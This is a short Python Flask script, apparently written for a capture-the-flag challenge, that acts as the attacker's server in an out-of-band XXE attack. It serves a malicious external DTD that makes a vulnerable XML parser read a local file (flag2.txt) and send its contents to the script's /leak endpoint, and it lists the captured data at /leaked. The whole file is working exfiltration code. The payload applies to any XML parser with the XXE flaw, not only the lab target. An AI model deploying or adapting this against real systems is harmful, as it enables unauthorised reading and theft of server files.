import os
from flask import Flask, request, jsonify

app = Flask(__name__)
LEAKS = []

# Optional hardcoded public URL (example: https://abc123.ngrok-free.app)
PUBLIC_BASE = os.environ.get("PUBLIC_BASE", "").rstrip("/")


def get_base_url():
    if PUBLIC_BASE:
        return PUBLIC_BASE

    # Works behind common tunnels/reverse proxies
    proto = request.headers.get("X-Forwarded-Proto", request.scheme)
    host = request.headers.get("X-Forwarded-Host", request.host)
    return f"{proto}://{host}"


@app.route("/evil.dtd")
def evil_dtd():
    base = get_base_url()

    # External DTD used by the vulnerable parser:
    # 1) Read local file from target (flag2)
    # 2) Trigger outbound HTTP request back to /leak with the file content
    dtd = f'''<!ENTITY % file SYSTEM "file:///flag2.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base}/leak?data=%file;'>">
%eval;
%exfil;
'''

    return dtd, 200, {"Content-Type": "application/xml-dtd"}


@app.route("/leak")
def leak():
    data = request.args.get("data", "")
    LEAKS.append(data)
    return "ok"


@app.route("/leaked")
def leaked():
    return jsonify(leaks=LEAKS, count=len(LEAKS))


@app.route("/clear", methods=["POST"])
def clear():
    LEAKS.clear()
    return jsonify(ok=True)


@app.route("/")
def home():
    return (
        "External XXE OOB webhook is running. "
        "Use /evil.dtd as external entity and check /leaked for captured data."
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9000)
